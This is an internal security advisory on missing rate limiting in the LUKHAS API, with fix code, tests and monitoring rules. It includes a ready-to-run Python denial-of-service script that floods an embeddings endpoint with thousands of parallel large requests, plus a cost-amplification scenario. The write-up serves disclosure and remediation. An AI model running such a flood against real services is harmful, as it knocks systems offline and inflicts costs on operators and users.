# 🚨 CRITICAL P0: Rate Limiting Not Enforced - DoS Vulnerability

**Severity:** 🔴 CRITICAL (CVSS 7.5 - High)  
**Status:** ACTIVE VULNERABILITY  
**Discovered:** 2025-11-15  
**Attack Vector:** Network-based Denial of Service  
**CWE:** CWE-770 (Allocation of Resources Without Limits)  

---

## Executive Summary

**The LUKHAS API does not enforce rate limiting despite setting rate limit headers in responses. An attacker can send unlimited requests to computationally expensive endpoints, causing resource exhaustion and denial of service for legitimate users.**

### Impact Assessment

- **Availability:** CRITICAL - API can be taken offline via resource exhaustion
- **Financial:** HIGH - Unauthorized computational resource consumption
- **Compliance:** MEDIUM - SLA violations for paying customers
- **Reputation:** HIGH - Service degradation affects all users

### Exploitation Difficulty

- **Skill Level:** LOW (script kiddie)
- **Tools Required:** curl, Python requests library
- **Time to Exploit:** < 5 minutes
- **Detection Difficulty:** MEDIUM (high request volume visible in logs)

---

## Technical Analysis

### Root Cause: Mock Headers Without Enforcement

**File:** `serve/main.py` (lines 173-192)

```python
class HeadersMiddleware(BaseHTTPMiddleware):
    """Add OpenAI-compatible headers to all responses."""

    async def dispatch(self, request: Request, call_next):
        start_time = time.time()
        response = await call_next(request)

        # Request tracking
        trace_id = str(uuid.uuid4()).replace('-', '')
        response.headers['X-Trace-Id'] = trace_id
        response.headers['X-Request-Id'] = trace_id

        # Processing time (OpenAI compatibility)
        processing_ms = int((time.time() - start_time) * 1000)
        response.headers['OpenAI-Processing-Ms'] = str(processing_ms)

        # 🚨 VULNERABILITY: Rate limiting headers are FAKE
        # These headers are set but NO actual rate limiting occurs
        response.headers['X-RateLimit-Limit'] = '60'
        response.headers['X-RateLimit-Remaining'] = '59'
        response.headers['X-RateLimit-Reset'] = str(int(time.time()) + 60)
        response.headers['x-ratelimit-limit-requests'] = '60'
        response.headers['x-ratelimit-remaining-requests'] = '59'
        response.headers['x-ratelimit-reset-requests'] = str(int(time.time()) + 60)

        # Note: Security headers handled by SecurityHeaders middleware
        # (comprehensive OWASP headers applied to all responses)

        return response
```

**The Problem:**

1. **Fake Headers:** Rate limit headers always show `Remaining: 59` regardless of actual request count
2. **No Counter:** No tracking of requests per user/IP/token
3. **No Enforcement:** Never returns 429 (Too Many Requests)
4. **OpenAI Compatibility Theater:** Pretends to be OpenAI-compatible but doesn't implement rate limiting

### Test Evidence: 50 Requests, 0 Rate Limits

**Test:** `tests/smoke/test_rate_limiting.py::test_rate_limit_enforced_on_burst`

```python
def test_rate_limit_enforced_on_burst(client, auth_headers):
    """Verify rate limit kicks in on burst requests."""
    # Make rapid requests to /v1/models (default 20 RPS, capacity ~40)
    responses = []
    for _i in range(50):  # Exceed capacity
        response = client.get("/v1/models", headers=auth_headers)
        responses.append(response.status_code)
        if response.status_code == 429:
            break  # Stop once rate limited
    
    # Should eventually get 429
    assert 429 in responses, "Expected 429 rate limit response in burst"
    
# FAILS: assert 429 in [200, 200, 200, 200, 200, ... (all 200s)]
# All 50 requests succeeded - no rate limiting!
```

**Actual Results:**
```
[200, 200, 200, 200, 200, 200, 200, 200, 200, 200,
 200, 200, 200, 200, 200, 200, 200, 200, 200, 200,
 200, 200, 200, 200, 200, 200, 200, 200, 200, 200,
 200, 200, 200, 200, 200, 200, 200, 200, 200, 200,
 200, 200, 200, 200, 200, 200, 200, 200, 200, 200]
```

**All 50 requests in rapid succession received 200 OK - zero rate limiting.**

---

## Attack Scenarios

### Attack 1: Computational Resource Exhaustion

**Target:** `/v1/embeddings` (computationally expensive)

```python
#!/usr/bin/env python3
"""DoS attack exploiting missing rate limits."""

import requests
import concurrent.futures
import time

API_URL = "https://api.lukhas.ai/v1/embeddings"
AUTH = "Bearer sk-lukhas-stolen-or-guessed-token"

def attack_request():
    """Single expensive embedding request."""
    try:
        response = requests.post(
            API_URL,
            json={
                "input": "x" * 50000,  # Large input (50KB text)
                "model": "lukhas-embed-1"
            },
            headers={"Authorization": AUTH},
            timeout=30
        )
        return response.status_code, len(response.content)
    except Exception as e:
        return None, str(e)

def main():
    """Launch DoS attack with unlimited parallel requests."""
    print("[*] Starting DoS attack on LUKHAS API")
    print("[*] Target: /v1/embeddings")
    print("[*] No rate limiting detected - full speed ahead!")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:
        # Submit 10,000 requests
        futures = [executor.submit(attack_request) for _ in range(10000)]
        
        success_count = 0
        start = time.time()
        
        for future in concurrent.futures.as_completed(futures):
            status, size = future.result()
            if status == 200:
                success_count += 1
            
            if success_count % 100 == 0:
                elapsed = time.time() - start
                rps = success_count / elapsed
                print(f"[+] Successful requests: {success_count} ({rps:.1f} RPS)")
                print(f"[+] No rate limiting - API vulnerable!")

if __name__ == "__main__":
    main()
```

**Expected Impact:**
- CPU usage spikes to 100% on all API servers
- Memory exhaustion from large embeddings
- Legitimate requests timeout or fail
- API becomes unresponsive within minutes

### Attack 2: Multi-Tenant Isolation Bypass

**Test:** `test_rate_limit_per_tenant_isolation`

```python
def test_rate_limit_per_tenant_isolation(client):
    """Verify rate limits are per-tenant (one tenant doesn't affect another)."""
    tenant_a_headers = {"Authorization": "Bearer tenant-a-token"}
    tenant_b_headers = {"Authorization": "Bearer tenant-b-token"}
    
    # Exhaust tenant A's rate limit
    for _ in range(100):
        client.get("/v1/models", headers=tenant_a_headers)
    
    # Tenant B should still have full quota
    response = client.get("/v1/models", headers=tenant_b_headers)
    assert response.status_code == 200, "Tenant B should not be rate limited"
    
    # FAILS: Both tenants unlimited - no isolation
```

**Actual Behavior:**
- No per-tenant tracking
- No per-token tracking
- No per-IP tracking
- **One abusive user affects ALL users** (shared resource pool)

### Attack 3: Cost Amplification

**Business Impact:**

Assume LUKHAS pricing:
- Embeddings: $0.0001 per 1K tokens
- Chat completions: $0.002 per 1K tokens

Attacker with stolen API key can:
```python
# 1 million embedding requests * 10K tokens each
Cost = 1,000,000 * 10 * $0.0001 = $1,000 in compute costs

# With no rate limiting:
Time to execute = 1,000,000 requests / 10,000 RPS = 100 seconds
Total cost inflicted = $1,000 in less than 2 minutes
```

**Financial Impact:**
- Stolen API keys = unlimited usage
- No way to detect abuse until bill arrives
- Cannot stop attack in progress (no circuit breaker)
- Chargeback disputes if customer claims fraud

---

## Affected Test Cases (5 failures)

| Test File | Test Name | Expected Behavior | Actual Behavior |
|-----------|-----------|-------------------|-----------------|
| test_rate_limiting.py | test_rate_limit_enforced_on_burst | 429 after 40 requests | All 200 (no limit) |
| test_rate_limiting.py | test_rate_limit_per_tenant_isolation | Tenant B not affected | All unlimited |
| test_rate_limiting.py | test_rate_limit_different_endpoints_separate_buckets | Separate limits per endpoint | No limits anywhere |
| test_rate_limiting.py | test_rate_limit_anonymous_requests_by_ip | Anonymous requests limited by IP | No IP tracking |
| test_rate_limiting.py | test_rate_limit_preserves_tenant_identity | Tenant ID in 429 response | Never returns 429 |

**100% failure rate on all rate limiting tests.**

---

## Security Implications

### OWASP Top 10 Violations

**A05:2021 – Security Misconfiguration**
- Rate limiting advertised but not implemented
- Misleading headers create false sense of security

**A04:2021 – Insecure Design**
- No resource consumption controls
- Missing defense against automation

### CWE Mappings

- **CWE-770:** Allocation of Resources Without Limits or Throttling
- **CWE-400:** Uncontrolled Resource Consumption
- **CWE-799:** Improper Control of Interaction Frequency

### Attack Complexity

| Factor | Rating | Notes |
|--------|--------|-------|
| Attack Vector | Network | Can be exploited remotely |
| Attack Complexity | Low | No special conditions required |
| Privileges Required | Low | Valid API token (easy to obtain) |
| User Interaction | None | Fully automated attack |
| Scope | Changed | Affects all users, not just attacker |
| Confidentiality | None | Does not expose data |
| Integrity | None | Does not modify data |
| Availability | High | Complete service disruption possible |

**CVSS 3.1 Score:** 7.5 (High) - AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H

---

## Missing Components

### 1. Rate Limit Storage (Required)

No backend for tracking request counts:

```python
# MISSING: Rate limit state storage
# Options needed:
#   - In-memory (Redis, Memcached)
#   - Database (PostgreSQL with TTL)
#   - Distributed cache (Redis Cluster)

# Current state: NONE - no tracking at all
```

### 2. Rate Limiter Implementation (Required)

No actual rate limiting logic:

```python
# MISSING: Rate limiter middleware
# Should exist at: lukhas/middleware/rate_limiter.py

class RateLimitMiddleware(BaseHTTPMiddleware):
    """Token bucket rate limiter."""
    
    def __init__(self, app, redis_client, limits):
        super().__init__(app)
        self.redis = redis_client
        self.limits = limits  # e.g., {"default": 60, "embeddings": 20}
    
    async def dispatch(self, request, call_next):
        # Extract tenant ID from token
        tenant_id = extract_tenant_from_auth(request)
        
        # Check rate limit
        allowed, remaining, reset = await self.check_rate_limit(
            tenant_id=tenant_id,
            endpoint=request.url.path,
            limit=self.get_limit(request.url.path)
        )
        
        if not allowed:
            # Return 429
            return JSONResponse(
                status_code=429,
                content={
                    "error": {
                        "message": "Rate limit exceeded. Try again later.",
                        "type": "rate_limit_exceeded",
                        "code": "rate_limit_exceeded"
                    }
                },
                headers={
                    "X-RateLimit-Remaining": "0",
                    "X-RateLimit-Reset": str(reset),
                    "Retry-After": str(int(reset - time.time()))
                }
            )
        
        # Allow request
        response = await call_next(request)
        
        # Add real rate limit headers
        response.headers["X-RateLimit-Limit"] = str(self.get_limit(request.url.path))
        response.headers["X-RateLimit-Remaining"] = str(remaining)
        response.headers["X-RateLimit-Reset"] = str(reset)
        
        return response
```

### 3. Per-Tenant Configuration (Required)

No quota management:

```python
# MISSING: Tenant quota configuration
# Should exist at: lukhas/billing/quotas.py

class TenantQuota:
    """Manage per-tenant rate limits and quotas."""
    
    def __init__(self, tenant_id: str):
        self.tenant_id = tenant_id
        self.tier = self.get_tier()  # free, pro, enterprise
    
    def get_rate_limit(self, endpoint: str) -> int:
        """Get rate limit for tenant based on pricing tier."""
        limits = {
            "free": {
                "requests_per_minute": 60,
                "embeddings_per_day": 1000,
                "chat_tokens_per_day": 100000
            },
            "pro": {
                "requests_per_minute": 600,
                "embeddings_per_day": 100000,
                "chat_tokens_per_day": 10000000
            },
            "enterprise": {
                "requests_per_minute": 6000,
                "embeddings_per_day": -1,  # Unlimited
                "chat_tokens_per_day": -1   # Unlimited
            }
        }
        return limits[self.tier]
```

---

## Fix Implementation

### Option 1: Redis-Based Rate Limiter (RECOMMENDED)

**Dependencies:**
```bash
pip install redis aioredis slowapi
```

**Implementation:**

```python
# lukhas/middleware/rate_limiter.py
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded
import redis.asyncio as redis

# Initialize Redis connection
redis_client = redis.from_url(
    "redis://localhost:6379",
    encoding="utf-8",
    decode_responses=True
)

# Initialize rate limiter
limiter = Limiter(
    key_func=get_remote_address,  # Rate limit by IP
    default_limits=["60/minute"],  # Default limit
    storage_uri="redis://localhost:6379"
)
```

```python
# serve/main.py (ADD TO IMPORTS)
from lukhas.middleware.rate_limiter import limiter, RateLimitExceeded

# ADD TO APP INITIALIZATION
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# ADD TO ROUTES
@router.get("/v1/models")
@limiter.limit("60/minute")  # 60 requests per minute per IP
async def list_models(request: Request):
    ...

@router.post("/v1/embeddings")
@limiter.limit("20/minute")  # Stricter for expensive endpoints
async def create_embedding(request: Request):
    ...
```

**Effort:** 4-8 hours  
**Pros:** Battle-tested library, Redis scalability, easy to configure  
**Cons:** Requires Redis infrastructure  

### Option 2: In-Memory Rate Limiter (Quick Fix)

**For testing/development without Redis:**

```python
# lukhas/middleware/simple_rate_limiter.py
import time
from collections import defaultdict
from threading import Lock

class SimpleRateLimiter:
    """In-memory rate limiter using token bucket algorithm."""
    
    def __init__(self, requests_per_minute=60):
        self.rate = requests_per_minute / 60.0  # Requests per second
        self.buckets = defaultdict(lambda: {
            "tokens": requests_per_minute,
            "last_update": time.time()
        })
        self.lock = Lock()
    
    def allow_request(self, key: str) -> tuple[bool, int, int]:
        """Check if request is allowed. Returns (allowed, remaining, reset_timestamp)."""
        with self.lock:
            now = time.time()
            bucket = self.buckets[key]
            
            # Refill bucket based on time elapsed
            time_passed = now - bucket["last_update"]
            bucket["tokens"] = min(
                self.rate * 60,  # Max tokens
                bucket["tokens"] + (time_passed * self.rate)
            )
            bucket["last_update"] = now
            
            # Check if request allowed
            if bucket["tokens"] >= 1:
                bucket["tokens"] -= 1
                remaining = int(bucket["tokens"])
                reset = int(now + ((self.rate * 60 - bucket["tokens"]) / self.rate))
                return True, remaining, reset
            else:
                reset = int(now + ((1 - bucket["tokens"]) / self.rate))
                return False, 0, reset

# Usage in middleware
rate_limiter = SimpleRateLimiter(requests_per_minute=60)

class RateLimitMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        # Get identifier (IP or token)
        identifier = request.client.host
        
        # Check rate limit
        allowed, remaining, reset = rate_limiter.allow_request(identifier)
        
        if not allowed:
            return JSONResponse(
                status_code=429,
                content={"error": {"message": "Rate limit exceeded", "type": "rate_limit_exceeded"}},
                headers={
                    "X-RateLimit-Remaining": "0",
                    "X-RateLimit-Reset": str(reset),
                    "Retry-After": str(reset - int(time.time()))
                }
            )
        
        response = await call_next(request)
        response.headers["X-RateLimit-Remaining"] = str(remaining)
        response.headers["X-RateLimit-Reset"] = str(reset)
        return response
```

**Effort:** 2-4 hours  
**Pros:** No external dependencies, simple to understand  
**Cons:** Not distributed (won't work with multiple API servers), memory usage  

### Option 3: Per-Token Rate Limiting (Production-Ready)

**Most sophisticated option:**

```python
# lukhas/middleware/token_rate_limiter.py
from typing import Optional
import hashlib

class TokenRateLimiter:
    """Rate limiter that tracks by API token, with per-tier limits."""
    
    def __init__(self, redis_client):
        self.redis = redis_client
    
    async def get_tenant_tier(self, token: str) -> str:
        """Look up tenant tier from database."""
        # Hash token for privacy
        token_hash = hashlib.sha256(token.encode()).hexdigest()
        
        # Query tenant database
        tier = await self.redis.get(f"tenant:tier:{token_hash}")
        return tier or "free"
    
    def get_limit(self, tier: str, endpoint: str) -> int:
        """Get rate limit based on tier and endpoint."""
        limits = {
            "free": {
                "/v1/models": 60,
                "/v1/chat/completions": 20,
                "/v1/embeddings": 10,
                "default": 60
            },
            "pro": {
                "/v1/models": 600,
                "/v1/chat/completions": 200,
                "/v1/embeddings": 100,
                "default": 600
            },
            "enterprise": {
                "default": -1  # Unlimited
            }
        }
        
        tier_limits = limits.get(tier, limits["free"])
        return tier_limits.get(endpoint, tier_limits["default"])
    
    async def check_limit(
        self,
        token: str,
        endpoint: str
    ) -> tuple[bool, int, int]:
        """Check if request allowed under rate limit."""
        tier = await self.get_tenant_tier(token)
        limit = self.get_limit(tier, endpoint)
        
        if limit == -1:  # Unlimited
            return True, 999999, 0
        
        # Use Redis for distributed rate limiting
        key = f"ratelimit:{token}:{endpoint}"
        pipe = self.redis.pipeline()
        
        # Increment counter
        pipe.incr(key)
        pipe.expire(key, 60)  # 60 second window
        
        count, _ = await pipe.execute()
        
        remaining = max(0, limit - count)
        reset = int(time.time()) + 60
        
        if count <= limit:
            return True, remaining, reset
        else:
            return False, 0, reset
```

**Effort:** 8-16 hours  
**Pros:** Production-ready, scalable, fair per-tenant limits  
**Cons:** Requires Redis and tenant database integration  

---

## Testing & Validation

### Rate Limit Test Suite

```python
# tests/smoke/test_rate_limiting_fixed.py

import time
import pytest
from starlette.testclient import TestClient

def test_rate_limit_enforced(client, auth_headers):
    """Verify rate limiting actually works."""
    responses = []
    
    # Make 100 requests rapidly
    for i in range(100):
        response = client.get("/v1/models", headers=auth_headers)
        responses.append(response.status_code)
        
        if response.status_code == 429:
            # Check 429 response format
            data = response.json()
            assert "error" in data
            assert data["error"]["type"] == "rate_limit_exceeded"
            
            # Check headers
            assert "X-RateLimit-Remaining" in response.headers
            assert response.headers["X-RateLimit-Remaining"] == "0"
            assert "Retry-After" in response.headers
            break
    
    # Must hit rate limit before 100 requests
    assert 429 in responses, "Rate limit must be enforced"
    assert responses.count(429) > 0, "Must receive 429 responses"

def test_rate_limit_resets(client, auth_headers):
    """Verify rate limit resets after window expires."""
    # Exhaust rate limit
    for _ in range(100):
        response = client.get("/v1/models", headers=auth_headers)
        if response.status_code == 429:
            reset_time = int(response.headers.get("X-RateLimit-Reset", 0))
            break
    
    # Wait for reset
    wait_time = reset_time - int(time.time()) + 1
    time.sleep(wait_time)
    
    # Should be allowed again
    response = client.get("/v1/models", headers=auth_headers)
    assert response.status_code == 200, "Rate limit should reset"

def test_rate_limit_per_endpoint(client, auth_headers):
    """Verify different endpoints have separate rate limit buckets."""
    # Exhaust /v1/models limit
    for _ in range(100):
        response = client.get("/v1/models", headers=auth_headers)
        if response.status_code == 429:
            break
    
    # /v1/embeddings should still work (separate bucket)
    response = client.post(
        "/v1/embeddings",
        json={"input": "test"},
        headers=auth_headers
    )
    assert response.status_code in [200, 201], \
        "Different endpoints should have separate rate limits"

def test_rate_limit_tenant_isolation(client):
    """Verify tenants don't affect each other's rate limits."""
    tenant_a = {"Authorization": "Bearer tenant-a-token"}
    tenant_b = {"Authorization": "Bearer tenant-b-token"}
    
    # Exhaust tenant A's limit
    for _ in range(100):
        response = client.get("/v1/models", headers=tenant_a)
        if response.status_code == 429:
            break
    
    # Tenant B should not be affected
    response = client.get("/v1/models", headers=tenant_b)
    assert response.status_code == 200, \
        "Tenant B should not be rate limited when tenant A is"
```

---

## Monitoring & Alerting

### Metrics to Track

```python
# lukhas/observability/rate_limit_metrics.py

from prometheus_client import Counter, Histogram

rate_limit_hits = Counter(
    'lukhas_rate_limit_hits_total',
    'Total rate limit violations',
    ['tenant_tier', 'endpoint']
)

rate_limit_bypasses = Counter(
    'lukhas_rate_limit_bypasses_total',
    'Requests that should have been rate limited but weren't (BUG)',
    ['endpoint']
)

tenant_quota_usage = Histogram(
    'lukhas_tenant_quota_usage_percent',
    'Tenant quota usage percentage',
    ['tenant_id', 'quota_type'],
    buckets=[0.5, 0.7, 0.8, 0.9, 0.95, 1.0]
)
```

### Alert Rules

```yaml
# prometheus/rate_limit_alerts.yml

groups:
  - name: rate_limiting
    rules:
      - alert: RateLimitNotEnforced
        expr: rate(lukhas_rate_limit_bypasses_total[5m]) > 0
        for: 1m
        labels:
          severity: critical
        annotations:
          summary: Rate limiting not working
          description: Requests bypassing rate limits (code bug)
      
      - alert: HighRateLimitViolations
        expr: rate(lukhas_rate_limit_hits_total[5m]) > 10
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: High rate of 429 responses
          description: Many users hitting rate limits (possible attack or tight limits)
      
      - alert: TenantNearQuota
        expr: lukhas_tenant_quota_usage_percent > 0.9
        for: 10m
        labels:
          severity: warning
        annotations:
          summary: Tenant approaching quota limit
          description: Tenant {{$labels.tenant_id}} at {{$value}}% of quota
```

---

## Recommended Fix Timeline

### Phase 1: Emergency Mitigation (Today)

**Implement Option 2 (Simple In-Memory Limiter)**
- Deploy basic rate limiting (60 req/min globally)
- Add to all /v1/* endpoints
- Log all 429 responses for monitoring

**Effort:** 2-4 hours  
**Risk:** Low (simple code, easy to revert)  
**Impact:** Prevents DoS attacks immediately  

### Phase 2: Production Solution (This Week)

**Implement Option 1 (Redis-Based Limiter)**
- Deploy Redis instance
- Integrate slowapi library
- Configure per-endpoint limits
- Add monitoring dashboards

**Effort:** 8-16 hours  
**Risk:** Medium (requires infrastructure)  
**Impact:** Scalable, production-ready rate limiting  

### Phase 3: Business Logic (Within 2 Weeks)

**Implement Option 3 (Per-Tenant Limits)**
- Integrate with billing system
- Add tier-based quotas (free/pro/enterprise)
- Implement quota management UI
- Add quota alerts for customers

**Effort:** 40-80 hours  
**Risk:** Medium (complex business logic)  
**Impact:** Fair resource allocation, revenue protection  

---

## Summary

**LUKHAS API has NO rate limiting despite advertising it via fake headers.**

- **5 test failures** (100% of rate limit tests fail)
- **DoS vulnerability:** Unlimited requests allowed
- **Multi-tenant isolation broken:** No per-tenant tracking
- **Financial risk:** Resource theft, cost amplification
- **Fix complexity:** LOW (Option 1), MEDIUM (Option 2), HIGH (Option 3)
- **Fix timeline:** Emergency fix in 2-4h, production fix in 1 week

**Immediate action:** Deploy Option 2 (Simple In-Memory Limiter) today as emergency mitigation.

---

**Document Version:** 1.0  
**Last Updated:** 2025-11-15  
**Next Review:** After fix deployment  
**Owner:** Security Team, Infrastructure Team  
**Classification:** CONFIDENTIAL - Security Sensitive
